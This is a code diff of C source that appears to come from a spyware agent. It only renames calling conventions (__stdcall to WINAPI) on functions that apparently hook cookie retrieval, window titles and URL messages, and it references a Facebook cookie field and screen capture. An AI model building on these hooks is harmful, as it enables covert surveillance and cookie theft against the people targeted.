@@ -41,7 +41,7 @@ typedef struct _url_conf {
 	BOOL capture_screen;
 } url_conf;
 
-LRESULT __stdcall PM_SendMessageURL(HWND hWnd,
+LRESULT WINAPI PM_SendMessageURL(HWND hWnd,
 								    UINT Msg,
 								    WPARAM wParam,
 								    LPARAM lParam)
@@ -98,7 +98,7 @@ DWORD PM_SendMessageURL_setup(HMServiceStruct *pData)
 }
 
 
-BOOL __stdcall PM_SetWindowText(HWND hWnd,
+BOOL WINAPI PM_SetWindowText(HWND hWnd,
 								BYTE *text)
 {
 	BOOL *Active;
@@ -404,7 +404,7 @@ InternetGetCookieExStruct InternetGetCookieExData;
 
 
 #define COOKIE_MASK 0xFFFF
-BOOL __stdcall PM_InternetGetCookieEx(LPCWSTR lpszURL, LPCWSTR lpszCookieName, LPCWSTR lpszCookieData, LPDWORD lpdwSize, DWORD dwFlags, DWORD_PTR dwReserved)
+BOOL WINAPI PM_InternetGetCookieEx(LPCWSTR lpszURL, LPCWSTR lpszCookieName, LPCWSTR lpszCookieData, LPDWORD lpdwSize, DWORD dwFlags, DWORD_PTR dwReserved)
 {
 	DWORD ret_code;
 	DWORD name_len;
@@ -542,7 +542,7 @@ DWORD PM_InternetGetCookieEx_setup(HMServiceStruct *pData)
 }
 
 
-DWORD __stdcall PM_UrlLogDispatch(BYTE * msg, DWORD dwLen, DWORD dwFlags, FILETIME *dummy)
+DWORD WINAPI PM_UrlLogDispatch(BYTE * msg, DWORD dwLen, DWORD dwFlags, FILETIME *dummy)
 {
 	DWORD origin = COOKIE_MASK;
 	DWORD size = sizeof(shared.FACEBOOK_IE_COOKIE)-sizeof(char);
@@ -585,7 +585,7 @@ DWORD __stdcall PM_UrlLogDispatch(BYTE * msg, DWORD dwLen, DWORD dwFlags, FILETI
 }
 
 
-DWORD __stdcall PM_UrlLogStartStop(BOOL bStartFlag, BOOL bReset)
+DWORD WINAPI PM_UrlLogStartStop(BOOL bStartFlag, BOOL bReset)
 {
 	// Lo fa per prima cosa, anche se e' gia' in quello stato
 	// Altrimenti quando gli agenti sono in suspended(per la sync) e ricevo una conf
@@ -623,7 +623,7 @@ DWORD __stdcall PM_UrlLogStartStop(BOOL bStartFlag, BOOL bReset)
 }
 
 
-DWORD __stdcall PM_UrlLogInit(JSONObject elem)
+DWORD WINAPI PM_UrlLogInit(JSONObject elem)
 {
 	ZeroMemory(last_url, sizeof(last_url));
 	ZeroMemory(last_window_title, sizeof(last_window_title));
